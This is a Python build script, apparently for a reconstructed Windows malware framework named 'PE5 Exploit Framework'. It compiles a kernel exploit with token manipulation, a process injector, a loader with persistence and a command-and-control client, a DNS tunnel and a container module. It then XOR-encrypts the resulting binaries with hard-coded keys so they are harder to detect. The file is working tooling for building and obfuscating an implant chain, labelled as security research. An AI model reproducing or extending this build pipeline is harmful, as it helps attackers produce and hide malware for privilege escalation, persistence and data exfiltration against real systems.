#!/usr/bin/env python3
"""
PE5 Exploit Framework - Cross-Platform Build Script

RECONSTRUCTED FROM SECURITY ANALYSIS
Classification: TLP:RED - Security Research Only

This script handles building on:
- Windows (MSVC, MinGW)
- Linux (MinGW cross-compilation)

Usage:
    python build.py [options] [target]

Options:
    --compiler=msvc|mingw   Select compiler (default: auto-detect)
    --debug                 Build with debug symbols
    --encrypt               Encrypt output binaries
    --clean                 Clean build artifacts

Targets:
    all                     Build all modules (default)
    pe5                     PE #5 kernel exploit
    pe4                     PE #4 stub launcher
    pe1                     PE #1 main loader
    pe2                     PE #2 DNS tunnel
    pe3                     PE #3 container
"""

import os
import sys
import shutil
import subprocess
import argparse
from pathlib import Path
from typing import List, Optional, Tuple

#=============================================================================
# CONFIGURATION
#=============================================================================

BUILD_DIR = Path("build")
BIN_DIR = BUILD_DIR / "bin"
OBJ_DIR = BUILD_DIR / "obj"

# Source files for each module
MODULES = {
    "pe5": {
        "name": "PE #5 - Kernel Exploit",
        "sources": [
            "pe5_exploit/exploit.c",
            "pe5_exploit/token_manipulation.c",
            "pe5_exploit/decryption.c",
        ],
        "asm": ["pe5_exploit/exploit_asm.asm"],
        "output": "pe5_exploit",
        "libs": ["kernel32", "ntdll"],
        "entry_dll": "DllMain",
        "entry_exe": "PE5_ExploitMain",
    },
    "pe4": {
        "name": "PE #4 - Stub Launcher",
        "sources": [
            "pe4_stub/stub.c",
            "pe4_stub/injector.c",
        ],
        "asm": [],
        "output": "pe4_stub",
        "libs": ["kernel32", "ntdll"],
        "entry_dll": "DllMain",
        "entry_exe": "PE4_StubMain",
    },
    "pe1": {
        "name": "PE #1 - Main Loader",
        "sources": [
            "pe1_loader/loader.c",
            "pe1_loader/persistence.c",
            "pe1_loader/c2_client.c",
        ],
        "asm": [],
        "output": "pe1_loader",
        "libs": ["kernel32", "ntdll", "advapi32", "winhttp"],
        "entry_dll": "DllMain",
        "entry_exe": "PE1_LoaderMain",
    },
    "pe2": {
        "name": "PE #2 - DNS Tunnel",
        "sources": [
            "pe2_dns_tunnel/dns_tunnel.c",
        ],
        "asm": [],
        "output": "pe2_dns",
        "libs": ["kernel32", "dnsapi", "crypt32"],
        "entry_dll": "DllMain",
        "entry_exe": None,
    },
    "pe3": {
        "name": "PE #3 - Container",
        "sources": [
            "pe3_container/container.c",
        ],
        "asm": [],
        "output": "pe3_container",
        "libs": ["kernel32"],
        "entry_dll": "DllMain",
        "entry_exe": "PE3_ContainerMain",
    },
}

# XOR encryption keys for each module
ENCRYPTION_KEYS = {
    "pe5": 0xA4,
    "pe4": 0x55,
    "pe1": 0xDF,  # Rotating, base key
    "pe2": None,  # AES, dynamic
    "pe3": 0xC7,  # Rotating, base key
}

#=============================================================================
# COMPILER DETECTION
#=============================================================================

def find_msvc() -> Optional[Tuple[str, str, str]]:
    """Find MSVC compiler tools."""
    vswhere = Path(os.environ.get("ProgramFiles(x86)", "")) / \
              "Microsoft Visual Studio/Installer/vswhere.exe"
    
    if not vswhere.exists():
        return None
    
    try:
        result = subprocess.run(
            [str(vswhere), "-latest", "-property", "installationPath"],
            capture_output=True, text=True
        )
        vs_path = Path(result.stdout.strip())
        
        # Find vcvars64.bat
        vcvars = vs_path / "VC/Auxiliary/Build/vcvars64.bat"
        if vcvars.exists():
            return ("msvc", str(vs_path), str(vcvars))
    except Exception:
        pass
    
    return None


def find_mingw() -> Optional[Tuple[str, str, str]]:
    """Find MinGW-w64 compiler."""
    mingw_names = ["x86_64-w64-mingw32-gcc", "mingw64-gcc", "gcc"]
    
    for name in mingw_names:
        path = shutil.which(name)
        if path:
            # Verify it's MinGW
            try:
                result = subprocess.run([path, "-v"], capture_output=True, text=True)
                if "mingw" in result.stderr.lower():
                    return ("mingw", path, path.replace("gcc", ""))
            except Exception:
                pass
    
    return None


def detect_compiler() -> Tuple[str, str, str]:
    """Auto-detect available compiler."""
    if sys.platform == "win32":
        msvc = find_msvc()
        if msvc:
            return msvc
    
    mingw = find_mingw()
    if mingw:
        return mingw
    
    raise RuntimeError("No suitable compiler found. Install MSVC or MinGW-w64.")


#=============================================================================
# BUILD FUNCTIONS
#=============================================================================

def setup_dirs():
    """Create build directories."""
    BUILD_DIR.mkdir(exist_ok=True)
    BIN_DIR.mkdir(exist_ok=True)
    OBJ_DIR.mkdir(exist_ok=True)


def clean():
    """Remove build artifacts."""
    if BUILD_DIR.exists():
        shutil.rmtree(BUILD_DIR)
    print("Cleaned.")


def compile_msvc(sources: List[str], output: str, libs: List[str], 
                 is_dll: bool, entry: Optional[str], debug: bool) -> bool:
    """Compile with MSVC."""
    print(f"  Compiling with MSVC...")
    
    cflags = ["/nologo", "/W4", "/O2", "/GS-", "/I", "common"]
    if debug:
        cflags.extend(["/Zi", "/Od"])
    
    # Compile each source
    obj_files = []
    for src in sources:
        obj = OBJ_DIR / (Path(src).stem + ".obj")
        obj_files.append(str(obj))
        
        cmd = ["cl"] + cflags + ["/c", f"/Fo{obj}", src]
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode != 0:
            print(f"  ERROR: {result.stderr.decode()}")
            return False
    
    # Link
    ldflags = ["/nologo"]
    if is_dll:
        ldflags.append("/DLL")
        out_file = BIN_DIR / f"{output}.dll"
    else:
        out_file = BIN_DIR / f"{output}.exe"
    
    ldflags.append(f"/OUT:{out_file}")
    if entry:
        ldflags.append(f"/ENTRY:{entry}")
    
    lib_args = [f"{lib}.lib" for lib in libs]
    
    cmd = ["link"] + ldflags + obj_files + lib_args
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        print(f"  ERROR: {result.stderr.decode()}")
        return False
    
    print(f"  Output: {out_file}")
    return True


def compile_mingw(sources: List[str], output: str, libs: List[str],
                  is_dll: bool, entry: Optional[str], debug: bool,
                  gcc_path: str) -> bool:
    """Compile with MinGW-w64."""
    print(f"  Compiling with MinGW...")
    
    cflags = ["-Wall", "-O2", "-I", "common"]
    if debug:
        cflags.extend(["-g", "-O0"])
    
    ldflags = []
    if is_dll:
        ldflags.append("-shared")
        out_file = BIN_DIR / f"{output}.dll"
    else:
        out_file = BIN_DIR / f"{output}.exe"
    
    ldflags.append(f"-o{out_file}")
    
    if entry:
        ldflags.append(f"-Wl,-e{entry}")
    
    lib_args = [f"-l{lib}" for lib in libs]
    
    cmd = [gcc_path] + cflags + sources + ldflags + lib_args
    result = subprocess.run(cmd, capture_output=True)
    if result.returncode != 0:
        print(f"  ERROR: {result.stderr.decode()}")
        return False
    
    print(f"  Output: {out_file}")
    return True


def xor_encrypt_file(filepath: Path, key: int, rotating: bool = False):
    """XOR encrypt a file."""
    data = filepath.read_bytes()
    encrypted = bytearray(len(data))
    
    if rotating:
        for i, b in enumerate(data):
            current_key = (key + (i & 0xFF)) & 0xFF
            encrypted[i] = b ^ current_key
    else:
        for i, b in enumerate(data):
            encrypted[i] = b ^ key
    
    encrypted_path = filepath.with_suffix(filepath.suffix + ".enc")
    encrypted_path.write_bytes(bytes(encrypted))
    print(f"  Encrypted: {encrypted_path}")


def build_module(module_id: str, compiler: Tuple[str, str, str], 
                 debug: bool, encrypt: bool) -> bool:
    """Build a single module."""
    module = MODULES[module_id]
    print(f"\n[{module_id.upper()}] Building {module['name']}...")
    print("-" * 40)
    
    compiler_type, compiler_path, _ = compiler
    
    # Build DLL
    if compiler_type == "msvc":
        success = compile_msvc(
            module["sources"], module["output"], module["libs"],
            is_dll=True, entry=module["entry_dll"], debug=debug
        )
    else:
        success = compile_mingw(
            module["sources"], module["output"], module["libs"],
            is_dll=True, entry=module["entry_dll"], debug=debug,
            gcc_path=compiler_path
        )
    
    if not success:
        return False
    
    # Build EXE if entry point defined
    if module.get("entry_exe"):
        if compiler_type == "msvc":
            success = compile_msvc(
                module["sources"], module["output"], module["libs"],
                is_dll=False, entry=module["entry_exe"], debug=debug
            )
        else:
            success = compile_mingw(
                module["sources"], module["output"], module["libs"],
                is_dll=False, entry=module["entry_exe"], debug=debug,
                gcc_path=compiler_path
            )
    
    # Encrypt if requested
    if encrypt and success:
        key = ENCRYPTION_KEYS.get(module_id)
        if key:
            dll_path = BIN_DIR / f"{module['output']}.dll"
            rotating = module_id in ["pe1", "pe3"]
            xor_encrypt_file(dll_path, key, rotating)
    
    return success


#=============================================================================
# MAIN
#=============================================================================

def main():
    parser = argparse.ArgumentParser(description="PE5 Framework Build System")
    parser.add_argument("target", nargs="?", default="all",
                        choices=["all", "pe5", "pe4", "pe1", "pe2", "pe3", "clean"])
    parser.add_argument("--compiler", choices=["msvc", "mingw"], 
                        help="Select compiler")
    parser.add_argument("--debug", action="store_true", 
                        help="Build with debug symbols")
    parser.add_argument("--encrypt", action="store_true",
                        help="Encrypt output binaries")
    
    args = parser.parse_args()
    
    print("=" * 50)
    print("PE5 EXPLOIT FRAMEWORK BUILD SYSTEM")
    print("=" * 50)
    
    if args.target == "clean":
        clean()
        return 0
    
    # Detect or select compiler
    try:
        if args.compiler:
            if args.compiler == "msvc":
                compiler = find_msvc()
            else:
                compiler = find_mingw()
            
            if not compiler:
                print(f"ERROR: {args.compiler} not found")
                return 1
        else:
            compiler = detect_compiler()
        
        print(f"Compiler: {compiler[0].upper()}")
    except RuntimeError as e:
        print(f"ERROR: {e}")
        return 1
    
    setup_dirs()
    
    # Build targets
    targets = list(MODULES.keys()) if args.target == "all" else [args.target]
    
    success = True
    for target in targets:
        if not build_module(target, compiler, args.debug, args.encrypt):
            success = False
            print(f"\n[{target.upper()}] BUILD FAILED")
    
    if success:
        print("\n" + "=" * 50)
        print("BUILD SUCCESSFUL")
        print("=" * 50)
        print(f"\nOutput files in: {BIN_DIR}/")
        for f in BIN_DIR.glob("*"):
            size = f.stat().st_size
            print(f"  {f.name:30} {size:>10,} bytes")
        return 0
    
    return 1


if __name__ == "__main__":
    sys.exit(main())
